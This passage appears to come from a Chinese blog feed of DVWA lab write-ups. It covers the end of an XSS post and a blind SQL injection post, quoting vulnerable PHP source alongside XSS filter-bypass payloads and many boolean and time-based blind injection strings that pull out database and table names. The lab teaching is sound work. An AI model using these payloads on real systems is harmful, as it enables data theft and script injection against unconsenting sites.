函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。<br>message参数使用了htmlspecialchars函数进行HTML编码，无法注入XSS代码。</b></p><h2 id="High难度-1"><a href="#High难度-1" class="headerlink" title="High难度"></a>High难度</h2><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">// Sanitize message input</span><br><span class="line">$message = strip_tags( addslashes( $message ) );</span><br><span class="line">$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">// Sanitize name input</span><br><span class="line">$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );</span><br><span class="line">$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>name过滤了<code>&lt;script</code>,使用其他标签如<code>iframe</code>即可。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085350565.png" alt></p><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">// Sanitize message input</span><br><span class="line">$message = stripslashes( $message );</span><br><span class="line">$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">// Sanitize name input</span><br><span class="line">$name = stripslashes( $name );</span><br><span class="line">$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>采用了token机制防止CSRF攻击，对name和message都采用htmlspecialchars函数编码防止XSS，sql语句用pdo对象防止SQL注入。</p><h1 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h1><h2 id="LOW级别-2"><a href="#LOW级别-2" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>是个下拉框，不过可以抓包改参数</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085427650.png" alt></p><p><strong>查看源代码</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085440616.png" alt></p><p>indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。<br>substring() 方法用于提取字符串中介于两个指定下标之间的字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);</span><br></pre></td></tr></table></figure></p><p>default=后面的参数变成了该语句中的lang,也就是：<br><code>&lt;option value=&quot;lang&quot;&gt;decodeURI(lang)&lt;/option&gt;</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085520725.png" alt></p><p>同样可以闭合前面的option标签和select标签</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085530567.png" alt></p><h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><p><strong>PHP源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;</span><br><span class="line">$default = $_GET[&apos;default&apos;];</span><br><span class="line"># Do not allow script tags</span><br><span class="line">if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;</span><br><span class="line">header (&quot;location: ?default=English&quot;);</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>stripos,查找 “第二个参数” 在第一个参数中第一次出现的位置。<br>也就是说过滤了<code>&lt;script</code></p><p><strong>绕过方法1</strong>：<br>url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085741861.png" alt></p><p><strong>绕过方法2</strong>：</p><p>用img，iframe，body，svg等标签的特性去执行JS代码。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085753972.png" alt></p><h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;</span><br><span class="line"></span><br><span class="line"># White list the allowable languages</span><br><span class="line">switch ($_GET[&apos;default&apos;]) &#123;</span><br><span class="line">case &quot;French&quot;:</span><br><span class="line">case &quot;English&quot;:</span><br><span class="line">case &quot;German&quot;:</span><br><span class="line">case &quot;Spanish&quot;:</span><br><span class="line"># ok</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">header (&quot;location: ?default=English&quot;);</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>限定了键名必须为default，键值必须为固定的4个值。</p><p>所以这里只能用#绕过服务器检测</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326090041546.png" alt></p><h2 id="impossible级别-1"><a href="#impossible级别-1" class="headerlink" title="impossible级别"></a>impossible级别</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326090325140.png" alt></p><p>把decodeuri变成了一个简单的括号，js是从URL中获得的lang参数并不会对他进行解码。所以无法构造XSS代码。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326090332523.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习（四）SQL Injection（Blind）</title>
      <link href="/2018/05/15/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89SQL-Injection%EF%BC%88Blind%EF%BC%89/"/>
      <url>/2018/05/15/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89SQL-Injection%EF%BC%88Blind%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（四）SQL Injection（Blind）<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><p>盲注分为三类：<br>•基于布尔SQL盲注<br>•基于时间的SQL盲注<br>•基于报错的SQL盲注</p><p>构造payload让信息通过错误提示回显出来</p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1-5 显示 User ID exists in the database.</span><br><span class="line">id=1&apos; 或者大于5显示 User ID is MISSING from the database</span><br><span class="line">id=1&apos; or 1=&apos;1 显示 User ID exists in the database.</span><br><span class="line">id=1 or 1=1 显示 User ID exists in the database.</span><br><span class="line">id=1&apos; and &apos;1&apos;=&apos;0 显示 User ID is MISSING from the database.</span><br><span class="line">id=1&apos; and &apos;1&apos;=&apos;1 显示 User ID exists in the database.</span><br><span class="line">id=1 and 1=0 显示 User ID exists in the database.</span><br></pre></td></tr></table></figure><p><strong>可以判断为单引号闭合</strong></p><p>1.对ascii值爆破的方法：<br>输入<code>1&#39; and length(database())=4 %23</code>，显示存在，所以数据库名为4个字符长度。<br><code>id=1&#39; and if(ascii(substr((select database()),1,1))=100,1,0)%23&amp;Submit=Submit显示User ID exists in the database</code>.说明数据库名第一个字母ascii为100，即d。同理可以知道数据库名为<code>dvwa</code>。</p><p><strong>表的数量</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and (select count (table_name) from information_schema.tables where table_schema=database())=1 %23 显示不存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and (select count (table_name) from information_schema.tables where table_schema=database())=2 %23 显示存在</span><br></pre></td></tr></table></figure></p><p><code>id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 %23</code><br>显示<code>User ID exists in the database</code>.说明第一个数据表的第一个字母ascii为103，同理可以得到这个表的名字和下一个表users的名字。</p><p>2.手动二分法猜解</p><p><strong>库名</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&gt;97 %23 ，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&lt;122 %23，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&lt;109 %23，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&lt;103 %23，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&lt;100 %23，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(databse(),1,1))&gt;100 %23，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</span><br></pre></td></tr></table></figure></p><p><strong>表名</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 %23 显示存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 %23 显示存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 %23 显示存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 %23 显示不存在</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 %23 显示不存在</span><br></pre></td></tr></table></figure></p><p>3.基于时间的盲注</p><p><code>id=1&#39; and sleep(5)%23</code> 有延迟<br><code>id=1 and sleep(5)%23</code> 没有延迟<br>说明存在字符型的基于时间的盲注。</p><p><strong>猜数据库名的长度</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and if(length(database())=1,sleep(5),1)%23 没有延迟</span><br><span class="line">id=1&apos; and if(length(database())=4,sleep(5),1)%23 有延迟</span><br></pre></td></tr></table></figure></p><p>说明库名长度为4</p><p><strong>二分法猜解库名</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)%23有延迟</span><br><span class="line">···</span><br><span class="line">1&apos; and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</span><br><span class="line"></span><br><span class="line">1&apos; and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</span><br></pre></td></tr></table></figure></p><p>库名第一个字母ascii为100</p><p>同理可以猜出表的个数 长度 名字以及列和数据。</p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_GET[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">$num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errors</span><br><span class="line">if( $num &gt; 0 ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// User wasn&apos;t found, so the page wasn&apos;t!</span><br><span class="line">header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>根据源码，发现id没有经过任何过滤就被放入sql语句。如果查询返回的结果数大于0就显示<code>&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;</code>，否则<code>&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;</code></p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><p>变成了下拉选项，查看源码参数名为id且为post方式。hackbar或者burp抓包改参数即可</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（四）SQL-Injection（Blind）/20190326080731815.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and 1=1报错</span><br><span class="line">id=1 and 1=1正确</span><br><span class="line">id=1 and 1=0报错</span><br></pre></td></tr></table></figure><p>说明为数字型。</p><p>其余方法和low难度大同小异</p><p><strong>布尔盲注：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</span><br><span class="line"></span><br><span class="line">id=1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</span><br><span class="line"></span><br><span class="line">id=1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</span><br></pre></td></tr></table></figure></p><p><strong>时间盲注：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</span><br><span class="line"></span><br><span class="line">id=1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</span><br><span class="line"></span><br><span class="line">id=1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</span><br></pre></td></tr></table></figure></p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_POST[ &apos;id&apos; ];</span><br><span class="line">$id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">$num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errors</span><br><span class="line">if( $num &gt; 0 ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>与low难度相比多了一个<code>mysqli_real_escape_string</code>函数转义，但是这里的参数是数字型，不需要单引号双引号去闭合，加不加这个函数效果一样。</p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p>在另外一个页面填写参数结果显示到该页面。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（四）SQL-Injection（Blind）/20190326080906073.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and 1=1#正确</span><br><span class="line">id=1&apos; and 1=0#错误</span><br><span class="line">id=1 and 1=1#正确</span><br><span class="line">id=1 and 1=0#正确</span><br></pre></td></tr></table></figure></p><p>所以是单引号闭合</p><p>另外有时候显示错误的时候，页面会延迟一会。<br>所以智能用布尔盲注。方法与前两个难度大同小异。</p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_COOKIE[ &apos;id&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_COOKIE[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">$num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errors</span><br><span class="line">if( $num &gt; 0 ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Might sleep a random amount</span><br><span class="line">if( rand( 0, 5 ) == 3 ) &#123;</span><br><span class="line">sleep( rand( 2, 4 ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// User wasn&apos;t found, so the page wasn&apos;t!</span><br><span class="line">header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>用COOKIE传递参数id，并且没有任何过滤，SQL语句后面加了一个limit 1限制返回的结果数为1。<br>另外如果查询的结果数&lt;=0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if( rand( 0, 5 ) == 3 )</span><br><span class="line">&#123;</span><br><span class="line">sleep( rand( 2, 4 ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>该代码的意思是，在0-5随机生成一个随机整数数，如果该随机数等于3，就执行sleep(2,4)随机延迟2到4秒。所以不能用时间盲注，只能用布尔盲注。不过如果把时间盲注响应时间延长一点也是可以判断的，但是会很麻烦.</p><h2 id="Impossible难度"><a href="#Impossible难度" class="headerlink" title="Impossible难度"></a>Impossible难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 